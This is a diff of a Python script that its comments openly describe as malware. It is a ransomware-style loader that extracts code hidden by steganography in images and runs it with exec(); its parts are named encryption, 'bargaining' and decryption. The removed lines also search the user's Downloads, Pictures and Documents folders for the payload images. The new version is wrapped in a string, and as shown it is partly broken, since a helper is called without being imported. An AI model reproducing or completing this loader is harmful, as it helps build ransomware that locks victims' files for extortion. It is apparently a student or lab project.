@@ -1,62 +1,47 @@
-import os
-from extract import extract_message
+'''#import os
+#from extract import extract_file
 
 
 def main():
-    # Represents the name of the two images to be scanned for in the downloads directory
-    with open ("images.txt", "r") as file:
-        lines = file.readlines()
-        image_containing_key: str = lines[0].strip("\n")
-        image_containing_encryption_code: str = lines[1].strip("\n")
-
-    # Represents whether the two images were found or not
-    key_found: bool = False
-    code_found: bool = False
-
-    # Scans the Downloads folder to look for the images and applications needed
-    # for the malware to remain operational
-    whitelist: list[str] = [image_containing_key, image_containing_encryption_code]
-
-    # Searches through current directory to find the embedded files
-    if os.path.exists(image_containing_key) and os.path.exists(image_containing_encryption_code):
-        ready_to_attack: bool = True
-    else:
-        raise FileNotFoundError(f"Check if the image name/path '{image_containing_key}' or "
-                                f"'{image_containing_encryption_code}' exists in the current directory. "
-                                f"It could also be that the name fed to the variable in the code needs to be updated "
-                                f"or the image specified just doesn't exist.")
-
-    # Determines whether both the key and code were found
-
     # Retrieves malicious code secretly embedded in one of the images
     with open("passphrase.txt", "r") as file:
         lines = file.readlines()
         passphrase = lines[0].strip("\n")
-    code_to_encrypt_files: str = extract_message(image_containing_encryption_code, passphrase)
+    #code_to_encrypt_files: str = extract_file(image_containing_encryption_code, passphrase)
 
-    # Have to keep looking for them at all times until both are found
-    while not ready_to_attack:
-        # Checks to see if the images are in Downloads or if user moved them to
-        # another directory
-        directories_to_be_searched = [os.path.expanduser("~/Downloads"),
-                                      os.path.expanduser("~/Pictures"),
-                                      os.path.expanduser("~/Documents")]
+    # Represents the name of the two images to be scanned for
+    with open ("images.txt", "r") as file:
+        lines = file.readlines()
+        image_containing_key: str = lines[0].strip("\n")
+        image_containing_encryption_code: str = lines[1].strip("\n")
+        image_containing_bargaining_code: str = lines[2].strip("\n")
+        image_containing_decryption_code: str = lines[3].strip("\n")
 
-        # Looks through all files in a given directory to keep searching for the key and code
-        for directory in directories_to_be_searched:
-            for _, _, files in os.walk(directory):
-                for file in files:
-                    if file in whitelist:
-                        if file == image_containing_key:
-                            key_found = True
-                        if file == image_containing_encryption_code:
-                            code_found = True
-                        ready_to_attack = key_found and code_found
-                    print(file)
+    # Represents whether the 4 images were found or not
+    key_found: bool = os.path.exists(image_containing_key)
+    encrypt_code_found: bool = os.path.exists(image_containing_encryption_code)
+    bargain_code_found: bool = os.path.exists(image_containing_bargaining_code)
+    decrypt_code_found: bool = os.path.exists(image_containing_decryption_code)
+    try:
+        if key_found and encrypt_code_found and bargain_code_found and decrypt_code_found:
+            code_to_encrypt: str = extract_file(image_containing_encryption_code, passphrase)
+            # Runs the malicious script (our "encrypt.py")
+            exec(code_to_encrypt)
+        else:
+            ready_to_attack: bool = False
+            for file in [key_found, encrypt_code_found, bargain_code_found, decrypt_code_found]:
+                if file is False:
+                    raise FileNotFoundError(f"The image name/path {file} doesn't exist in the current directory."
+                                            f"Either the name fed to the variable in the code to be updated, the image"
+                                            f"was deleted, or the image specified just doesn't exist.")
 
-    # Runs the malicious code (our "encrypt.py")
-    if ready_to_attack:
-        exec(code_to_encrypt_files)
+    except FileNotFoundError as fnfe:
+        print(f"File Not Found: {fnfe}")
+        return
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+        return
 
 
 main()
+'''
